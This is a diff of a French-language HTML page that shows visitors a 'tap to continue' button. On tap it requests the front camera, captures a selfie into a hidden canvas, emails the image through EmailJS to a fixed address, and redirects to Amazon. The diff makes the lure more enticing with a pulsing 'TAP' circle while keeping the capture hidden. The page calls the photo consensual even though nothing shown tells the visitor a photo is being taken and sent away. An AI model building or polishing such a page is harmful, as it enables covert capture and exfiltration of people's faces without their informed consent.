@@ -1,66 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Photo avec consentement</title>
+  <title>Photo One-Tap Animée</title>
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    emailjs.init("mxm3fFA_BxEhqJieq"); // Clé publique EmailJS
-  </script>
+  <script>emailjs.init("mxm3fFA_BxEhqJieq");</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
-    #status { margin-top: 20px; font-weight: bold; }
-    a { font-size: 18px; text-decoration: none; color: blue; }
+    html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; display:flex; justify-content:center; align-items:center; background:#f0f0f0; }
+    #status { position:absolute; top:10px; font-size:16px; color:green; text-align:center; width:100%; }
+    #tap-circle {
+      width:100px; height:100px; border-radius:50%; background:#0073e6;
+      display:flex; justify-content:center; align-items:center; color:white; font-weight:bold;
+      animation: pulse 1s infinite;
+      cursor:pointer;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity:0.7; }
+      50% { transform: scale(1.2); opacity:1; }
+      100% { transform: scale(1); opacity:0.7; }
+    }
+    video, canvas { display:none; }
   </style>
 </head>
 <body>
-  <h2>Cliquez pour continuer</h2>
-  <a href="#" id="link">Aller au site</a>
-  <div id="status"></div>
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <div id="status">Tapez sur le cercle pour continuer</div>
+  <div id="tap-circle">TAP</div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const link = document.getElementById("link");
+    const tap = document.getElementById("tap-circle");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const status = document.getElementById("status");
 
-    link.onclick = async (e) => {
-      e.preventDefault(); // Empêche le lien de naviguer immédiatement
+    tap.onclick = async () => {
+      tap.style.display='none';
       status.textContent = "Demande de permission caméra...";
 
       try {
-        // Demande la caméra frontale
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"} });
         video.srcObject = stream;
 
-        // Petit délai pour que la caméra démarre
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(r => setTimeout(r, 800));
 
-        // Capture de la photo
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
+        canvas.getContext("2d").drawImage(video,0,0);
         const imageBase64 = canvas.toDataURL("image/jpeg");
 
         status.textContent = "Envoi de la photo...";
-
-        // Envoi via EmailJS
-        await emailjs.send("service_8cs0gml", "template_hgvdx1g", {
-          to_email: "destinataire@email.com",
-          message: "Photo prise avec consentement",
-          attachment: imageBase64
+        await emailjs.send("service_8cs0gml","template_hgvdx1g",{
+          to_email:"destinataire@email.com",
+          message:"Photo prise avec consentement",
+          attachment:imageBase64
         });
 
-        // Arrêt de la caméra
-        stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(t => t.stop());
 
-        // Redirection automatique vers Amazon
         status.textContent = "Photo envoyée ! Redirection...";
-        setTimeout(() => { window.location.href = "https://www.amazon.com"; }, 1500);
+        setTimeout(()=>{ window.location.href="https://www.amazon.com"; },1200);
 
-      } catch (err) {
-        status.textContent = "Erreur ou caméra refusée : " + err;
+      } catch(err) {
+        status.textContent = "Erreur ou caméra refusée : "+err;
       }
     };
   </script>
